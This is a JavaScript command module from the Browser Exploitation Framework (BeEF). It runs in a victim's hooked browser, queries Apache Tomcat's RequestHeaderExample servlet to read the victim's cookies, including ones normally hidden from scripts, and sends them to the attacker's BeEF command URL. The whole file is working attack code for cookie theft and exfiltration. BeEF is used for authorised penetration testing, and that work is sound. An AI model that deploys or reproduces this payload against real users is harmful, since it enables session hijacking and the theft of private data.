//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  request_header_servlet_path = "<%= @request_header_servlet_path %>";

  function parseResponse() {
    var cookie_dict = {};

    if (xhr.readyState == 4) {
      if (xhr.status == 404) {
        beef.debug("[apache_tomcat_examples_cookie_disclosure] RequestHeaderExample not found");
        return;
      }

      if (xhr.status != 200) {
        beef.debug("[apache_tomcat_examples_cookie_disclosure] Unexpected HTTP response status " + xhr.status)
        return;
      }

      if (!xhr.responseText) {
        beef.debug("[apache_tomcat_examples_cookie_disclosure] No response content")
        return;
      }

      beef.debug("[apache_tomcat_examples_cookie_disclosure] Received HTML content (" + xhr.responseText.length + " bytes)");

      var content = xhr.responseText.replace(/\r|\n/g,'').match(/<table.*?>(.+)<\/table>/)[0];

      if (!content || !content.length) {
        beef.debug("[apache_tomcat_examples_cookie_disclosure] Unexpected response: No HTML table in response")
        return;
      }

      var cookies = content.match(/cookie<\/td><td>(.+)<\/td>?/)[1].split('; ');
      for (var i=0; i<cookies.length; i++) {
        var s_c = cookies[i].split('=', 2);
        cookie_dict[s_c[0]] = s_c[1];
      }
      var result = JSON.stringify(cookie_dict);

      beef.net.send("<%= @command_url %>", <%= @command_id %>, "cookies=" + result);
    }
  }
		
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = parseResponse;
  xhr.open("GET", request_header_servlet_path, true);
  xhr.send();
});
